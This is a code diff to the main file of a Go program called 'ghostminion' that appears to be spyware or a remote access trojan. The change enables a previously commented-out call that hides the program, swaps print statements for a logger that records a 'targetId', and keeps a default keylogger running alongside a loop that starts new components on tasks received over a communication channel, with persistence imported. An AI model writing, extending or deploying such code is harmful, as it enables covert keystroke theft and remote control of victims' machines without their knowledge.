@@ -1,13 +1,13 @@
 package main
 
 import (
-	"fmt"
 	"ghostminion/apps"
 	"ghostminion/communication"
 	"ghostminion/config"
 	"ghostminion/db"
+	"ghostminion/hider"
+	"ghostminion/logger"
 	"ghostminion/persistence"
-	"log"
 )
 
 const (
@@ -21,10 +21,12 @@ func main() {
 		panic(err)
 	}
 
-	//err = hider.Hide()
-	//if err != nil {
-	//	panic(err)
-	//}
+	log := logger.GetLogger()
+	defer func(log *logger.Logger) {
+		_ = log.Close() //TODO: do not ignore this error
+	}(log)
+
+	hider.Hide()
 
 	err = db.Init(configInstance.Installation.DBPath, configInstance.Installation.DBPassword)
 	if err != nil {
@@ -38,7 +40,8 @@ func main() {
 	if err != nil {
 		return
 	}
-	fmt.Println("targetId:", targetId)
+
+	log.Debug("targetId: %s", targetId)
 
 	appManager := apps.GetAppManagerInstance()
 	appManager.StartApp(string(apps.KeyLoggerTask)+"_default", &apps.KeyLoggerApp{})
@@ -57,7 +60,7 @@ func main() {
 	for task := range taskCh {
 		// TODO: handle config change
 		if app, err := apps.NewAppFactory(task); err != nil {
-			log.Print(err)
+			log.Warn("could not make app from task err: %s", err.Error())
 		} else {
 			appManager.StartApp(task.Name, app)
 		}
